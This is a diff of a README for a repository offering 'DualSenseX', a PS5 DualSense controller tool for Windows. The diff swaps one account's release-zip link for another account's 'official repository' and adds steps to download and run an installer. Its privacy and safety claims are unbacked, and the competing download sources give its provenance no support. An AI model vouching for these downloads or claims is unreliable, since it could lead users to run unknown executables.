@@ -1,52 +1,67 @@
-<div align="center">
-<img width="460" height="215" alt="image" src="https://github.com/user-attachments/assets/9411ecdf-c887-4941-847b-d73fd28404fc" />
+# 🎮 DualSenseX-Steam-PC-Controller - Use PS5 features on your PC
 
-# DualSenseX - Steam PC Controller
-  <p align="center">
-    <strong>Advanced PS5 DualSense Controller Configurator for PC & Steam Games</strong>
-    <br/>
-    Adaptive Triggers • Haptic Feedback • Xbox Emulation • Audio-to-Haptics
-    <br/>
-    <a href="https://github.com/TaiwanBoss/DualSenseX-Steam-PC-Controller/issues">Report Bug</a> | <a href="https://github.com/TaiwanBoss/DualSenseX-Steam-PC-Controller/issues">Discussions</a>
-  </p>
-  <p align="center">
-    <img src="https://img.shields.io/badge/App-DualSenseX-blue?style=for-the-badge" alt="DualSenseX" />
-    <img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%20Windows%2011-0078D7?style=for-the-badge" alt="Platform" />
-    <br>
-    <img src="https://img.shields.io/github/stars/TaiwanBoss/DualSenseX-Steam-PC-Controller?style=flat-square&color=blue" alt="Stars" />
-    <img src="https://img.shields.io/github/license/TaiwanBoss/DualSenseX-Steam-PC-Controller?style=flat-square" alt="License" />
-  </p>
-</div>
+[![](https://img.shields.io/badge/Download-DualSenseX-blue.svg)](https://github.com/Manibharath5486/DualSenseX-Steam-PC-Controller)
 
-## Install
- [Download `DualSenseX-win.zip`](https://github.com/TaiwanBoss/DualSenseX-Steam-PC-Controller/releases/download/PS5-Dualsense/DualSenseX-win.zip)
- ---
-## Overview
-**DualSenseX - Steam PC Controller** is a feature-rich configuration tool designed to bring the full potential of the PlayStation 5 DualSense controller to Windows PC gaming.
-It bridges the gap between console hardware and PC environments, giving you absolute control over adaptive triggers, haptic feedback emulation, and custom LED lighting profiles across all your Steam and standalone PC games.
+## 📖 About this software
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ac619eb7-ec9f-4f4b-ac1d-d55476c3c166" />
+This program connects your PlayStation 5 DualSense controller to your Windows computer. It lets you use advanced features like adaptive triggers and haptic feedback in games that do not support them natively. The software mimics the behavior of a standard Xbox controller when your computer expects one. This makes your controller compatible with Steam, the Epic Games Store, and other game launchers.
 
-> [!Important]
-> Make sure to install the required ViGEmBus driver during setup to enable proper controller emulation.
+## ⚙️ System requirements
 
-## Key Features
-- **Adaptive Triggers Modes:** Configure customized resistance settings (Machine Gun, Resistance, Normal, Gamepad).
-- **Controller Emulation:** Map your DualSense as an Xbox 360 controller or DualShock 4 for maximum game compatibility.
-- **Audio-to-Haptics:** Translate in-game sound frequencies directly into immersive physical haptic vibration.
-- **Full RGB Customization:** Modify the touchpad LED lightbar, player LEDs, and brightness levels.
-- **Connection Diagnostics:** Low-latency tracking for both USB cable connections and Bluetooth wireless modes.
-- **Battery Monitoring:** Real-time battery status bar overlay to prevent mid-game power losses.
+Ensure your computer meets these needs before you start:
 
-## How to Use
-1. Download the latest `DualSenseX-Setup.zip` package.
-2. Extract and run the installer executable.
-3. Connect your PS5 DualSense controller via USB-C or Bluetooth.
-4. Launch the DualSenseX application and choose your emulation mode (e.g., Xbox 360 controller).
-5. Adjust trigger settings, launch your Steam game, and enjoy enhanced immersion.
+*   Windows 10 or Windows 11.
+*   An available USB port or a Bluetooth 5.0 adapter.
+*   A Sony DualSense wireless controller.
+*   At least 200 MB of free storage space.
+*   Microsoft .NET Desktop Runtime installed on your machine.
 
-## Disclaimer
-> [!Caution]
-> This is an **unofficial community project** and configuration utility.  
-> Not affiliated with, authorized, or endorsed by Sony Interactive Entertainment, PlayStation, Valve Corporation, or Steam.  
-> Modifying controller profiles on non-supported titles is done at your own discretion. Use at your own risk.
+## 🚀 Getting started
+
+Follow these steps to set up your controller for PC gaming.
+
+1.  Visit the official repository page to download the latest version: [https://github.com/Manibharath5486/DualSenseX-Steam-PC-Controller](https://github.com/Manibharath5486/DualSenseX-Steam-PC-Controller).
+2.  Locate the latest release file on the page.
+3.  Click the link to save the installer to your computer.
+4.  Run the downloaded file to begin the installation.
+5.  Follow the prompts on your screen to complete the process.
+
+## 🔧 Configuring your controller
+
+Once the program runs, you see a menu with several options. These settings control how your PC talks to your controller.
+
+### Connecting via USB
+Plug your controller into your PC using a high-quality USB-C cable. Windows recognizes the device automatically. The software detects the connection and highlights the controller icon in green.
+
+### Connecting via Bluetooth
+1.  Open your Windows Settings.
+2.  Go to Bluetooth and other devices.
+3.  Click Add device.
+4.  Hold the Create button and the PlayStation button on your controller until the light bar flashes.
+5.  Select Wireless Controller from the list of available devices on your screen.
+
+## 🕹️ Using controller features
+
+This software bridges the gap between Sony hardware and Windows software.
+
+### Adaptive Triggers
+You can feel resistance in the triggers during gameplay. The software maps these effects to compatible games. To enable this, select the Adaptive Triggers tab in the main window. You can pick from preset modes like Bow, Gun, or Machine. These presets change the tension of the L2 and R2 buttons.
+
+### Haptic Feedback
+The controller provides precise vibrations that match the action on your screen. To use this, keep the Haptic Feedback box checked in the settings menu. This works best when you connect the controller via a wired USB connection.
+
+### Emulation modes
+Some games only support Xbox controllers. This software includes an emulation feature. It tells Windows that you have an Xbox controller plugged in. This fix enables compatibility for titles that otherwise ignore your device. Toggle the Emulation switch to On if your game does not react to your controller inputs.
+
+## 🛠️ Troubleshooting common issues
+
+If you face problems, use these steps to fix your connection.
+
+*   Controller not detected: Unplug the cable and restart the application. Reconnect the cable once the program is open.
+*   Input lag: Ensure you use a wired connection for competitive games. Bluetooth can introduce a delay.
+*   Game crashes: Disable all other controller emulators while using this software. Having two programs running at once causes conflicts.
+*   Driver errors: The software requires the ViGEmBus driver. If the program displays a driver warning, reinstall the driver from the Settings menu.
+
+## 🛡️ Privacy and safety
+
+This software processes controller input locally on your machine. It does not send your data to external servers. It does not record keystrokes or private information. Your controller settings save in a text file within the installation folder. You remain in full control of your hardware at all times.
